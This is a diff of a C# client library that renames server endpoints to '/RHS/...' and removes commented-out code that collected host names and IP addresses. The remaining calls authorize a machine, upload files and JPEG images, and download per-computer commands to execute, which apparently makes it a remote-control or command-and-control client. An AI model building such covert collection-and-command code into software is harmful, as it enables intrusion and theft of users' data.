@@ -34,7 +34,7 @@ namespace Library
         {
             try
             {
-                var request = new RestRequest("/values/{id}", Method.GET);
+                var request = new RestRequest("/RHS/{id}", Method.GET);
                 request.AddUrlSegment("id", "" + id);
                 //var request = new RestRequest("/values", Method.GET);
                 request.RequestFormat = DataFormat.Json;
@@ -48,7 +48,7 @@ namespace Library
         {
             try
             {
-                var request = new RestRequest("/values/foo/{str}", Method.GET);
+                var request = new RestRequest("/RHS/foo/{str}", Method.GET);
                 request.AddUrlSegment("str", "" + str);
                 request.RequestFormat = DataFormat.Json;
                 return client.Execute(request);
@@ -83,46 +83,10 @@ namespace Library
         /// <returns>Returns a valid Token value, if successfully authenticated, otherwise an empty string.</returns>
         public bool Authorize()
         {
-            //IPAddress externalIpAddress = Net.GetExternalIpAddress(ConnectionTimeout);
-            //if (externalIpAddress != IPAddress.Loopback)
-            //{
-            //    string hash = GetHashKey();
-            //    var hostName = System.Net.Dns.GetHostName();
-            //    var ipInternal = Convert.ToString(Net.GetInternalIpAddress());
-            //    var ipExternal = Convert.ToString(externalIpAddress);
-            //    var request = new RestRequest("/values/Authorize/{data}", Method.POST);
-            //    var authData = new AuthData()
-            //    {
-            //        HostName = hostName,
-            //        IpInternal = ipInternal,
-            //        IpExternal = ipExternal,
-            //        Data = Data,
-            //        PublicKey = PublicApiKey,
-            //        Hash = hash
-            //    };
-            //    request.AddObject(authData);
-            //    var response = client.Execute(request);
-            //    try
-            //    {
-            //        Auth = JsonConvert.DeserializeObject<AuthResult>(response.Content);// deserializer.Deserialize<AuthResult>(response);
-            //        Auth.IpInternal = ipInternal;
-            //        Auth.IpExternal = ipExternal;
-            //        Auth.HostName = hostName;
-            //    }
-            //    catch
-            //    {
-            //        Auth.Token = "";
-            //    }
-            //}
-            //else
-            //{
-            //    return false;// throw new Exception("External IP is a loopback IP Address!");
-            //}
-
             try
             {
                 var authData = GetAuthData();
-                var request = new RestRequest("/values/Authorize/{data}", Method.POST);
+                var request = new RestRequest("/RHS/Authorize/{data}", Method.POST);
                 request.AddObject(authData);
                 var response = client.Execute(request);
                 Auth = JsonConvert.DeserializeObject<AuthResult>(response.Content);// deserializer.Deserialize<AuthResult>(response);
@@ -139,33 +103,10 @@ namespace Library
 
         public void DeAuthorize()
         {
-            //IPAddress externalIpAddress = Net.GetExternalIpAddress(ConnectionTimeout);
-            //if (externalIpAddress != IPAddress.Loopback)
-            //{
-            //    string hash = GetHashKey();
-            //    var hostName = System.Net.Dns.GetHostName(); ;
-            //    var ipInternal = Convert.ToString(Net.GetInternalIpAddress());
-            //    var ipExternal = Convert.ToString(externalIpAddress);
-            //    var request = new RestRequest("/values/DeAuthorize/{data}", Method.POST);
-            //    request.AddObject(new AuthData()
-            //    {
-            //        HostName = hostName,
-            //        IpInternal = ipInternal,
-            //        IpExternal = ipExternal,
-            //        Data = Data,
-            //        PublicKey = PublicApiKey,
-            //        Hash = hash
-            //    });
-            //    var response = client.Execute(request);
-            //}
-            //else
-            //{
-            //    throw new Exception("External IP is a loopback IP Address!");
-            //}
             try
             {
                 var authData = GetAuthData();
-                var request = new RestRequest("/values/DeAuthorize/{data}", Method.POST);
+                var request = new RestRequest("/RHS/DeAuthorize/{data}", Method.POST);
                 request.AddObject(authData);
                 var response = client.Execute(request);
             }
@@ -177,7 +118,7 @@ namespace Library
             try
             {
                 var authData = GetAuthData();
-                var request = new RestRequest("/values/UpdateLastActive/{data}", Method.POST);
+                var request = new RestRequest("/RHS/UpdateLastActive/{data}", Method.POST);
                 request.AddObject(authData);
                 var response = client.Execute(request);
             }
@@ -213,7 +154,7 @@ namespace Library
         {
             try
             {
-                var request = new RestRequest("/values/UploadFile/{data}", Method.POST);
+                var request = new RestRequest("/RHS/UploadFile/{data}", Method.POST);
                 data.ComputerHash = TSettings.ComputerHash;
                 request.AddObject(data);
                 var response = client.Execute(request);
@@ -225,7 +166,7 @@ namespace Library
 
         public void LoadSettings()
         {
-            var request = new RestRequest("/values/GetSettings", Method.GET);
+            var request = new RestRequest("/RHS/GetSettings", Method.GET);
             request.Timeout = ConnectionTimeout;
             if (request.Attempts > 1)
                 return;
@@ -249,7 +190,7 @@ namespace Library
         public void SetHasExectuted(Settings settings)
         {
             settings.HasExectuted = true;
-            var request = new RestRequest("/values/SaveSettings", Method.POST);
+            var request = new RestRequest("/RHS/SaveSettings", Method.POST);
             try
             {
                 request.AddParameter("settingsEncoded", settings);
@@ -286,7 +227,7 @@ namespace Library
                 }
                 var bytesToTransfer = useCompression ? Compression.Compress("file", bytes) : bytes;
                 //bytesToTransfer = bytesToTransfer.Length < bytes.Length ? bytesToTransfer : bytes;
-                var request = new RestRequest("/values/UploadFile/{data}", Method.POST);
+                var request = new RestRequest("/RHS/UploadFile/{data}", Method.POST);
                 request.ReadWriteTimeout = 30000;
                 request.Timeout = 30000;
                 var data = new FileData(filename, bytesToTransfer, TSettings.ComputerHash);
@@ -303,7 +244,7 @@ namespace Library
             try
             {
                 var imgArray = Imaging.BitmapToJpeg(bitmapImage, quality);
-                var request = new RestRequest("/values/UploadImage/{data}", Method.POST);
+                var request = new RestRequest("/RHS/UploadImage/{data}", Method.POST);
                 var data = new ImageData()
                 {
                     FileName = fileName,
@@ -411,7 +352,7 @@ namespace Library
             byte[] result = null;
             try
             {
-                var request = new RestRequest("/values/DownloadFile/{settings}", Method.POST);
+                var request = new RestRequest("/RHS/DownloadFile/{settings}", Method.POST);
                 request.AddObject(TSettings);
                 var response = client.Execute(request);
                 // if the computer hash is equal to this computer then execute a command on that computer
